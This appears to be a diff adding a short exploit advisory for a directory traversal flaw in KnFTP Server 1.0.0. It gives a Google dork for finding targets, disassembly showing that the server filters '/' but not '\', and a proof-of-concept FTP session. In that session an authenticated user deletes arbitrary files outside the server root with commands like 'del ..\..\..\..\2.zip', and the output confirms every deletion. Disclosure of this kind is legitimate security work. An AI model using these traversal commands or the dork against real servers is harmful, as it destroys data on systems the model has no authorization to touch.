@@ -1,0 +1,71 @@
+# Exploit Title: KnFTP Server Directory Traversal delete any file Vulnerability 
+# Google Dork: "KnFTP Server" "Directory Traversal"
+# Date: 2011-09-17
+# Author:  instruder of Code Audit Labs of vulnhunt.com( 834858875 [at] qq [dot] com )
+# Software Link: http://ncu.dl.sourceforge.net/project/knftp/KnFTPd/1.0.0/knftpd-1.0.0-bin.zip
+# Version: 1.0.0
+
+
+---------------
+Vulnerable code
+---------------
+asm in knftpd.exe 
+
+00401B58    8038 2F         CMP BYTE PTR DS:[EAX],2F  
+
+//has been filtered the '/'(0x2f)00401B5B    0F84 38010000   JE knftpd.00401C99
+
+00401B61    31DB            XOR EBX,EBX
+00401B63    31C0            XOR EAX,EAX
+00401B65    B9 FFFFFFFF     MOV ECX,-1
+00401B6A    8B7D 0C         MOV EDI,DWORD PTR SS:[EBP+C]
+00401B6D    F2:AE           REPNE SCAS BYTE PTR ES:[EDI]
+00401B6F    F7D1            NOT ECX
+00401B71    49              DEC ECX
+00401B72    898D E4EFFFFF   MOV DWORD PTR SS:[EBP-101C],ECX
+00401B78    39CB            CMP EBX,ECX
+00401B7A    0F8F B3000000   JG knftpd.00401C33
+00401B80    8DB5 E8EFFFFF   LEA ESI,DWORD PTR SS:[EBP-1018]
+00401B86    66:90           NOP
+00401B88    B9 FFFFFFFF     MOV ECX,-1
+00401B8D    89D7            MOV EDI,EDX
+00401B8F    31C0            XOR EAX,EAX
+00401B91    F2:AE           REPNE SCAS BYTE PTR ES:[EDI]
+00401B93    F7D1            NOT ECX
+00401B95    8D79 FF         LEA EDI,DWORD PTR DS:[ECX-1]
+00401B98    8B4D 0C         MOV ECX,DWORD PTR SS:[EBP+C]
+00401B9B    8A0419          MOV AL,BYTE PTR DS:[ECX+EBX]
+00401B9E    3C 2F           CMP AL,2F
+00401BA0    0F84 EC000000   JE knftpd.00401C92
+
+
+
+---
+PoC
+---
+ 
+D:\exploit\remote exploit\KnFTP Server>ftp 192.168.1.113
+Connected to 192.168.1.113.
+220 FTP Server ready.
+User (192.168.1.113:(none)): test
+331 User "test" okay.Please specify the password.
+Password:
+230 Loggin successful!
+ftp> del ..\..\..\..\2.zip
+257 File successfully deleted.
+ftp> del ..\..\..\..\1.zip
+257 File successfully deleted.
+ftp> del ..\..\..\..\1.doc
+257 File successfully deleted.
+ftp> quit
+221 Goodbye!
+
+
+
+
+KnFTP Server has been filtered the '/'(0x2f) ,but it dot not filter the '\'(0x5c).
+so we can send del command with "..\..\..\..\xx.doc" ,something like this.Then we 
+can delete any file in server .
+
+
+thank you!
